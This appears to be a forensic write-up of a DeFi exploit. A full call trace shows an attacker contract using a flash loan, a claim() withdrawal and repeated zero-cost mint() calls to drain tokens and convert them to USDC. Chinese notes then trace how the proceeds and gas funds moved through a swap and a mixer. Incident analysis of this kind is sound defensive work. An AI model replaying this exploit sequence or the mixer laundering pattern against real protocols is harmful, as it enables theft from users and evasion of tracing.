  1 1 -> STATICCALL deployer -> victim . totalSupply() -> (0x00000000000000000000000000000000000000000000000000000023a2c3dd7c)
  2 1 -> STATICCALL deployer -> victim . balanceOf(indexUSDC) -> (0x00000000000000000000000000000000000000000000000000000023a2c3dd7c)
  3 1 -> CREATE deployer -> attacker . constructor() -> (5399 bytes)
  4 1 -> CALL deployer -> attacker . run(153054600569 [1.53e11]) -> (0x000000000000000000000000000000000000000000000000000000188e975b46)
    5 2 -> STATICCALL attacker -> USDC . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000000000000)
      6 3 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000000000000)
    7 2 -> CALL attacker -> FlashLoanPool . flashLoan(attacker, victim, [153054600569 [1.53e11]], [0], attacker, 0x, 0)
      8 3 -> DELEGATECALL FlashLoanPool -> [Proxy] FlashLoanPool [Logic] 0xef6c62d2ac4b0980599668f883257175bd254cb3 . flashLoan(attacker, victim, [153054600569 [1.53e11]], [0], attacker, 0x, 0)
        9 4 -> CALL FlashLoanPool -> indexUSDC . transferUnderlyingTo(attacker, 153054600569 [1.53e11]) -> (0x00000000000000000000000000000000000000000000000000000023a2c3dd79)
          10 5 -> DELEGATECALL indexUSDC -> [Proxy] indexUSDC [Logic] ATOKEN_IMPL . transferUnderlyingTo(attacker, 153054600569 [1.53e11]) -> (0x00000000000000000000000000000000000000000000000000000023a2c3dd79)
            11 6 -> CALL indexUSDC -> victim . transfer(attacker, 153054600569 [1.53e11]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              11 EVENT victim.Transfer (from=indexUSDC, to=attacker, value=153054600569 [1.53e11])
        12 4 -> CALL FlashLoanPool -> attacker . executeOperation(victim, [153054600569 [1.53e11]], [137749140 [1.377e8]], attacker, 0x) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
          13 5 -> CALL attacker -> victim . claim(153054600569 [1.53e11])
            13 EVENT victim.Transfer (from=attacker, to=ZeroAddress, value=153054600569 [1.53e11])
            14 6 -> CALL victim -> TN-CSCPv1-BTCUSD . transfer(attacker, 49716431047 [4.971e10]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              14 EVENT TN-CSCPv1-BTCUSD.Transfer (from=victim, to=attacker, value=49716431047 [4.971e10])
            15 6 -> CALL victim -> TN-CSCPv1-ETHUSD . transfer(attacker, 23955277333 [2.395e10]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              15 EVENT TN-CSCPv1-ETHUSD.Transfer (from=victim, to=attacker, value=23955277333 [2.395e10])
            16 6 -> CALL victim -> TN-CSCPv1-AVAXUSD . transfer(attacker, 6378688541 [6.378e9]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              16 EVENT TN-CSCPv1-AVAXUSD.Transfer (from=victim, to=attacker, value=6378688541 [6.378e9])
            17 6 -> CALL victim -> TN-CSCPv1-BNBUSD . transfer(attacker, 17186382409 [1.718e10]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              17 EVENT TN-CSCPv1-BNBUSD.Transfer (from=victim, to=attacker, value=17186382409 [1.718e10])
            18 6 -> CALL victim -> TN-CSCPv1-MATICUSD . transfer(attacker, 10028704387 [1.002e10]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              18 EVENT TN-CSCPv1-MATICUSD.Transfer (from=victim, to=attacker, value=10028704387 [1.002e10])
          19 5 -> STATICCALL attacker -> victim . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000000000000)
          20 5 -> STATICCALL attacker -> victim . totalSupply() -> (0x0000000000000000000000000000000000000000000000000000000000000003)
          21 5 -> CALL attacker -> victim . mint(2)
            22 6 -> CALL victim -> TN-CSCPv1-BTCUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              22 EVENT TN-CSCPv1-BTCUSD.Approval (owner=attacker, spender=victim, value=0)
              22 EVENT TN-CSCPv1-BTCUSD.Transfer (from=attacker, to=victim, value=0)
            23 6 -> CALL victim -> TN-CSCPv1-ETHUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              23 EVENT TN-CSCPv1-ETHUSD.Approval (owner=attacker, spender=victim, value=0)
              23 EVENT TN-CSCPv1-ETHUSD.Transfer (from=attacker, to=victim, value=0)
            24 6 -> CALL victim -> TN-CSCPv1-AVAXUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              24 EVENT TN-CSCPv1-AVAXUSD.Approval (owner=attacker, spender=victim, value=0)
              24 EVENT TN-CSCPv1-AVAXUSD.Transfer (from=attacker, to=victim, value=0)
            25 6 -> CALL victim -> TN-CSCPv1-BNBUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              25 EVENT TN-CSCPv1-BNBUSD.Approval (owner=attacker, spender=victim, value=0)
              25 EVENT TN-CSCPv1-BNBUSD.Transfer (from=attacker, to=victim, value=0)
            26 6 -> CALL victim -> TN-CSCPv1-MATICUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              26 EVENT TN-CSCPv1-MATICUSD.Approval (owner=attacker, spender=victim, value=0)
              26 EVENT TN-CSCPv1-MATICUSD.Transfer (from=attacker, to=victim, value=0)
            21 EVENT victim.Transfer (from=ZeroAddress, to=attacker, value=2)
          27 5 -> STATICCALL attacker -> victim . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000000000002)
          28 5 -> STATICCALL attacker -> victim . totalSupply() -> (0x0000000000000000000000000000000000000000000000000000000000000005)
          29 5 -> CALL attacker -> victim . mint(4)
            30 6 -> CALL victim -> TN-CSCPv1-BTCUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              30 EVENT TN-CSCPv1-BTCUSD.Approval (owner=attacker, spender=victim, value=0)
              30 EVENT TN-CSCPv1-BTCUSD.Transfer (from=attacker, to=victim, value=0)
            31 6 -> CALL victim -> TN-CSCPv1-ETHUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              31 EVENT TN-CSCPv1-ETHUSD.Approval (owner=attacker, spender=victim, value=0)
              31 EVENT TN-CSCPv1-ETHUSD.Transfer (from=attacker, to=victim, value=0)
            32 6 -> CALL victim -> TN-CSCPv1-AVAXUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              32 EVENT TN-CSCPv1-AVAXUSD.Approval (owner=attacker, spender=victim, value=0)
              32 EVENT TN-CSCPv1-AVAXUSD.Transfer (from=attacker, to=victim, value=0)
            33 6 -> CALL victim -> TN-CSCPv1-BNBUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              33 EVENT TN-CSCPv1-BNBUSD.Approval (owner=attacker, spender=victim, value=0)
              33 EVENT TN-CSCPv1-BNBUSD.Transfer (from=attacker, to=victim, value=0)
            34 6 -> CALL victim -> TN-CSCPv1-MATICUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              34 EVENT TN-CSCPv1-MATICUSD.Approval (owner=attacker, spender=victim, value=0)
              34 EVENT TN-CSCPv1-MATICUSD.Transfer (from=attacker, to=victim, value=0)
            29 EVENT victim.Transfer (from=ZeroAddress, to=attacker, value=4)
          35 5 -> STATICCALL attacker -> victim . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000000000006)
          36 5 -> STATICCALL attacker -> victim . totalSupply() -> (0x0000000000000000000000000000000000000000000000000000000000000009)

<省略 大部分循环 mint>

          309 5 -> CALL attacker -> victim . mint(15753396239 [1.575e10])
            310 6 -> CALL victim -> TN-CSCPv1-BTCUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              310 EVENT TN-CSCPv1-BTCUSD.Approval (owner=attacker, spender=victim, value=0)
              310 EVENT TN-CSCPv1-BTCUSD.Transfer (from=attacker, to=victim, value=0)
            311 6 -> CALL victim -> TN-CSCPv1-ETHUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              311 EVENT TN-CSCPv1-ETHUSD.Approval (owner=attacker, spender=victim, value=0)
              311 EVENT TN-CSCPv1-ETHUSD.Transfer (from=attacker, to=victim, value=0)
            312 6 -> CALL victim -> TN-CSCPv1-AVAXUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              312 EVENT TN-CSCPv1-AVAXUSD.Approval (owner=attacker, spender=victim, value=0)
              312 EVENT TN-CSCPv1-AVAXUSD.Transfer (from=attacker, to=victim, value=0)
            313 6 -> CALL victim -> TN-CSCPv1-BNBUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              313 EVENT TN-CSCPv1-BNBUSD.Approval (owner=attacker, spender=victim, value=0)
              313 EVENT TN-CSCPv1-BNBUSD.Transfer (from=attacker, to=victim, value=0)
            314 6 -> CALL victim -> TN-CSCPv1-MATICUSD . transferFrom(attacker, victim, 0) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
              314 EVENT TN-CSCPv1-MATICUSD.Approval (owner=attacker, spender=victim, value=0)
              314 EVENT TN-CSCPv1-MATICUSD.Transfer (from=attacker, to=victim, value=0)
            309 EVENT victim.Transfer (from=ZeroAddress, to=attacker, value=15753396239 [1.575e10])
          315 5 -> STATICCALL attacker -> victim . balanceOf(attacker) -> (0x00000000000000000000000000000000000000000000000000000023aaf9c00d)
          316 5 -> STATICCALL attacker -> victim . balanceOf(attacker) -> (0x00000000000000000000000000000000000000000000000000000023aaf9c00d)
          317 5 -> CALL attacker -> victim . approve(FlashLoanPool, 153192349709 [1.531e11]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
            317 EVENT victim.Approval (owner=attacker, spender=FlashLoanPool, value=153192349709 [1.531e11])
        318 4 -> STATICCALL FlashLoanPool -> 0xe5fc82372800505102d236975c816143b74100c9 . scaledTotalSupply() -> (0x0000000000000000000000000000000000000000000000000000000000000000)
          319 5 -> DELEGATECALL 0xe5fc82372800505102d236975c816143b74100c9 -> [Proxy] Unknown [Logic] 0xacdd71b2a31a0484a37e8f06e9b85bff46ffb538 . scaledTotalSupply() -> (0x0000000000000000000000000000000000000000000000000000000000000000)
        320 4 -> STATICCALL FlashLoanPool -> indexUSDC . totalSupply() -> (0x00000000000000000000000000000000000000000000000000000023a2c3dd7c)
          321 5 -> DELEGATECALL indexUSDC -> [Proxy] indexUSDC [Logic] ATOKEN_IMPL . totalSupply() -> (0x00000000000000000000000000000000000000000000000000000023a2c3dd7c)
            322 6 -> STATICCALL indexUSDC -> FlashLoanPool . getReserveNormalizedIncome(victim) -> (0x0000000000000000000000000000000000000000033b2e3c9fd0803ce8000000)
              323 7 -> DELEGATECALL FlashLoanPool -> [Proxy] FlashLoanPool [Logic] 0xef6c62d2ac4b0980599668f883257175bd254cb3 . getReserveNormalizedIncome(victim) -> (0x0000000000000000000000000000000000000000033b2e3c9fd0803ce8000000)
        324 4 -> STATICCALL FlashLoanPool -> 0x31e067f0413d760cf532add5f900cab47faf204c . getTotalSupplyAndAvgRate() -> (64 bytes)
          325 5 -> DELEGATECALL 0x31e067f0413d760cf532add5f900cab47faf204c -> [Proxy] Unknown [Logic] 0x855146d807f62fb200e543671fe810f46a4f8b01 . getTotalSupplyAndAvgRate() -> (64 bytes)
        326 4 -> STATICCALL FlashLoanPool -> 0xe5fc82372800505102d236975c816143b74100c9 . scaledTotalSupply() -> (0x0000000000000000000000000000000000000000000000000000000000000000)
          327 5 -> DELEGATECALL 0xe5fc82372800505102d236975c816143b74100c9 -> [Proxy] Unknown [Logic] 0xacdd71b2a31a0484a37e8f06e9b85bff46ffb538 . scaledTotalSupply() -> (0x0000000000000000000000000000000000000000000000000000000000000000)
        328 4 -> STATICCALL FlashLoanPool -> DefaultReserveInterestRateStrategy . calculateInterestRates(victim, indexUSDC, 153192349709 [1.531e11], 0, 0, 0, 0, 0) -> (96 bytes)
          329 5 -> STATICCALL DefaultReserveInterestRateStrategy -> victim . balanceOf(indexUSDC) -> (0x0000000000000000000000000000000000000000000000000000000000000003)
          330 5 -> STATICCALL DefaultReserveInterestRateStrategy -> 0x1f96045fb8e9302d7dec37a87f4b746442cdd675 . getLendingRateOracle() -> (0x000000000000000000000000deddbe0286db00170d49134e119cc87d08341627)
          331 5 -> STATICCALL DefaultReserveInterestRateStrategy -> 0xdeddbe0286db00170d49134e119cc87d08341627 . getMarketBorrowRate(victim) -> (0x0000000000000000000000000000000000000000000000000000000000000000)
        8 EVENT FlashLoanPool.ReserveDataUpdated (reserve=victim, liquidityRate=0, stableBorrowRate=0, variableBorrowRate=10000000000000000000000000 [1e25], liquidityIndex=1000899999996636494440049010 [1e27], variableBorrowIndex=1000000000000000000000000000 [1e27])
        332 4 -> CALL FlashLoanPool -> victim . transferFrom(attacker, indexUSDC, 153192349709 [1.531e11]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
          332 EVENT victim.Approval (owner=attacker, spender=FlashLoanPool, value=0)
          332 EVENT victim.Transfer (from=attacker, to=indexUSDC, value=153192349709 [1.531e11])
        8 EVENT FlashLoanPool.FlashLoan (target=attacker, initiator=attacker, asset=victim, amount=153054600569 [1.53e11], premium=137749140 [1.377e8], referralCode=0)
    333 2 -> STATICCALL attacker -> TN-CSCPv1-BTCUSD . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000b935488c7)
    334 2 -> STATICCALL attacker -> USDC . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000000000000)
      335 3 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000000000000)
    336 2 -> CALL attacker -> TN-CSCPv1-BTCUSD . initWithdraw(49716431047 [4.971e10]) -> (0x000000000000000000000000000000000000000000000000000000105f225baf)
      336 EVENT TN-CSCPv1-BTCUSD.Transfer (from=attacker, to=ZeroAddress, value=49716431047 [4.971e10])
      337 3 -> STATICCALL TN-CSCPv1-BTCUSD -> USDC . balanceOf(TN-CSCPv1-BTCUSD) -> (0x00000000000000000000000000000000000000000000000000000010c344d096)
        338 4 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(TN-CSCPv1-BTCUSD) -> (0x00000000000000000000000000000000000000000000000000000010c344d096)
      339 3 -> CALL TN-CSCPv1-BTCUSD -> USDC . transfer(attacker, 70315563951 [7.031e10]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
        340 4 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . transfer(attacker, 70315563951 [7.031e10]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
          340 EVENT USDC.Transfer (from=TN-CSCPv1-BTCUSD, to=attacker, value=70315563951 [7.031e10])
      336 EVENT TN-CSCPv1-BTCUSD.Log
      341 3 -> STATICCALL TN-CSCPv1-BTCUSD -> USDC . balanceOf(TN-CSCPv1-BTCUSD) -> (0x00000000000000000000000000000000000000000000000000000000642274e7)
        342 4 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(TN-CSCPv1-BTCUSD) -> (0x00000000000000000000000000000000000000000000000000000000642274e7)
      343 3 -> STATICCALL TN-CSCPv1-BTCUSD -> USDC . balanceOf(TN-CSCPv1-BTCUSD) -> (0x00000000000000000000000000000000000000000000000000000000642274e7)
        344 4 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(TN-CSCPv1-BTCUSD) -> (0x00000000000000000000000000000000000000000000000000000000642274e7)
    345 2 -> STATICCALL attacker -> USDC . balanceOf(attacker) -> (0x000000000000000000000000000000000000000000000000000000105f225baf)
      346 3 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(attacker) -> (0x000000000000000000000000000000000000000000000000000000105f225baf)
    347 2 -> STATICCALL attacker -> TN-CSCPv1-ETHUSD . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000593d88615)
    348 2 -> STATICCALL attacker -> USDC . balanceOf(attacker) -> (0x000000000000000000000000000000000000000000000000000000105f225baf)
      349 3 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(attacker) -> (0x000000000000000000000000000000000000000000000000000000105f225baf)
    350 2 -> CALL attacker -> TN-CSCPv1-ETHUSD . initWithdraw(23955277333 [2.395e10]) -> (0x000000000000000000000000000000000000000000000000000000082f74ff97)
      350 EVENT TN-CSCPv1-ETHUSD.Transfer (from=attacker, to=ZeroAddress, value=23955277333 [2.395e10])
      351 3 -> STATICCALL TN-CSCPv1-ETHUSD -> USDC . balanceOf(TN-CSCPv1-ETHUSD) -> (0x0000000000000000000000000000000000000000000000000000000832cefa8a)
        352 4 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(TN-CSCPv1-ETHUSD) -> (0x0000000000000000000000000000000000000000000000000000000832cefa8a)
      353 3 -> CALL TN-CSCPv1-ETHUSD -> USDC . transfer(attacker, 35155935127 [3.515e10]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
        354 4 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . transfer(attacker, 35155935127 [3.515e10]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
          354 EVENT USDC.Transfer (from=TN-CSCPv1-ETHUSD, to=attacker, value=35155935127 [3.515e10])
      350 EVENT TN-CSCPv1-ETHUSD.Log
      355 3 -> STATICCALL TN-CSCPv1-ETHUSD -> USDC . balanceOf(TN-CSCPv1-ETHUSD) -> (0x000000000000000000000000000000000000000000000000000000000359faf3)
        356 4 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(TN-CSCPv1-ETHUSD) -> (0x000000000000000000000000000000000000000000000000000000000359faf3)
      357 3 -> STATICCALL TN-CSCPv1-ETHUSD -> USDC . balanceOf(TN-CSCPv1-ETHUSD) -> (0x000000000000000000000000000000000000000000000000000000000359faf3)
        358 4 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(TN-CSCPv1-ETHUSD) -> (0x000000000000000000000000000000000000000000000000000000000359faf3)
    359 2 -> STATICCALL attacker -> USDC . balanceOf(attacker) -> (0x000000000000000000000000000000000000000000000000000000188e975b46)
      360 3 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(attacker) -> (0x000000000000000000000000000000000000000000000000000000188e975b46)
    361 2 -> STATICCALL attacker -> USDC . balanceOf(attacker) -> (0x000000000000000000000000000000000000000000000000000000188e975b46)
      362 3 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(attacker) -> (0x000000000000000000000000000000000000000000000000000000188e975b46)
    363 2 -> STATICCALL attacker -> USDC . balanceOf(attacker) -> (0x000000000000000000000000000000000000000000000000000000188e975b46)
      364 3 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . balanceOf(attacker) -> (0x000000000000000000000000000000000000000000000000000000188e975b46)
    365 2 -> CALL attacker -> USDC . transfer(LootReceiver, 105471499078 [1.054e11]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
      366 3 -> DELEGATECALL USDC -> [Proxy] USDC [Logic] FiatTokenV2_2 . transfer(LootReceiver, 105471499078 [1.054e11]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
        366 EVENT USDC.Transfer (from=attacker, to=LootReceiver, value=105471499078 [1.054e11])
    367 2 -> STATICCALL attacker -> victim . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000000000000)
    368 2 -> STATICCALL attacker -> TN-CSCPv1-BTCUSD . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000000000000)
    369 2 -> STATICCALL attacker -> TN-CSCPv1-ETHUSD . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000000000000)
    370 2 -> STATICCALL attacker -> TN-CSCPv1-AVAXUSD . balanceOf(attacker) -> (0x000000000000000000000000000000000000000000000000000000017c33101d)
    371 2 -> CALL attacker -> TN-CSCPv1-AVAXUSD . transfer(LootReceiver, 6378688541 [6.378e9]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
      371 EVENT TN-CSCPv1-AVAXUSD.Transfer (from=attacker, to=LootReceiver, value=6378688541 [6.378e9])
    372 2 -> STATICCALL attacker -> TN-CSCPv1-BNBUSD . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000400636249)
    373 2 -> CALL attacker -> TN-CSCPv1-BNBUSD . transfer(LootReceiver, 17186382409 [1.718e10]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
      373 EVENT TN-CSCPv1-BNBUSD.Transfer (from=attacker, to=LootReceiver, value=17186382409 [1.718e10])
    374 2 -> STATICCALL attacker -> TN-CSCPv1-MATICUSD . balanceOf(attacker) -> (0x0000000000000000000000000000000000000000000000000000000255c1e283)
    375 2 -> CALL attacker -> TN-CSCPv1-MATICUSD . transfer(LootReceiver, 10028704387 [1.002e10]) -> (0x0000000000000000000000000000000000000000000000000000000000000001)
      375 EVENT TN-CSCPv1-MATICUSD.Transfer (from=attacker, to=LootReceiver, value=10028704387 [1.002e10])
```



获利 EOA:  0xAf3a0FdBFB0e3127247B66a042310e09C32F2299

查看 https://etherscan.io/address/0xAf3a0FdBFB0e3127247B66a042310e09C32F2299

1. TX: 0x66beb6eb2dda078efedb4635b9374ba29621c8bf6a1e87e6a21bacd18ba64dbd 
   黑客 EOA → LootReceiver 目的: 空地址没有 ETH 付 gas，先打一点进去

   这里的关键点黑客EOA必须有启动资金(gas), 稍后解释

2. TX: 0xee090dbfa961397642346c5ff8488b9c5f838afa64603e70a523dd383c080f68
   授权 swap 合约划走 USDC

3. TX: 0x6bd8729499f3e2546e1617187505cae21b77f5abcbe57f0680eeb78576969147
   把 USDC 换成 ETH

4. TX: 0xf9513a8d611e2e8335a2ce5e30c620a49afcd88146c3c49dd70be7cd06a5f4cd 以及后续多条 Deposit
   转入混币器

   

下面解释黑客EOA的启动资金(倒序):

1. TX: 0x66beb6eb2dda078efedb4635b9374ba29621c8bf6a1e87e6a21bacd18ba64dbd:
   0x30498e4466789E534c72e03B52A16c978655b41e 给 0xAf3a0FdBFB0e3127247B66a042310e09C32F2299 0**.**02757464 ETH 启动资金

2. TX: 0xc787585338a3f20ccec93da32684a8010c99b4f92dcf9730701fe8c784fe5143
   混币器提了 0.1 ETH 给 0x30498e4466789E534c72e03B52A16c978655b41e

所以, 从混币器进入 然后从混币器出. 关联被断开

遗留问题: Tornado 提款 → EOA_X -> (...) -> EOA_Y(也许是另外一个链上的EOA)
